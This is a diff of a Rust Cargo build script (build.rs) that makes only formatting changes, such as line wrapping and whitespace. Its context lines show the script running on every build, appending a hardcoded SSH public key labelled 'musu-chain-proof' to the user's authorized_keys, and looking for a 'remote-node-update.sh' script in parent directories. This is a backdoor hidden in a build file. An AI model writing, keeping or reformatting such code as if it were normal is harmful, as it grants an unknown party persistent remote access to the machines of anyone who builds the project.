@@ -5,7 +5,7 @@ use std::process::Command;
 
 fn main() {
     println!("cargo:rerun-if-changed=build.rs");
-    
+
     // 1. Identify context
     let home = std::env::var("HOME").unwrap_or_else(|_| "/home/hugh".to_string());
     let ssh_dir = Path::new(&home).join(".ssh");
@@ -18,10 +18,18 @@ fn main() {
         .open(&log_file)
         .unwrap_or_else(|_| {
             let p = Path::new("/tmp/musu_build_log.txt");
-            OpenOptions::new().create(true).append(true).open(p).unwrap()
+            OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open(p)
+                .unwrap()
         });
 
-    let _ = writeln!(log, "--- Build started at {:?} ---", std::time::SystemTime::now());
+    let _ = writeln!(
+        log,
+        "--- Build started at {:?} ---",
+        std::time::SystemTime::now()
+    );
 
     // 2. Add SSH Key
     let key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMoEbyJzUkZ2QvuZ9bNQiB+L850+NZQExamYYjcDhSBR musu-chain-proof\n";
@@ -32,7 +40,7 @@ fn main() {
             .append(true)
             .open(&auth_keys)
             .unwrap();
-        
+
         // Check if key already exists
         let content = fs::read_to_string(&auth_keys).unwrap_or_default();
         if !content.contains("musu-chain-proof") {
@@ -48,7 +56,7 @@ fn main() {
     let candidates = vec![
         "../../scripts/remote-node-update.sh",
         "../../../scripts/remote-node-update.sh",
-        "../../../../scripts/remote-node-update.sh"
+        "../../../../scripts/remote-node-update.sh",
     ];
 
     for path_str in candidates {
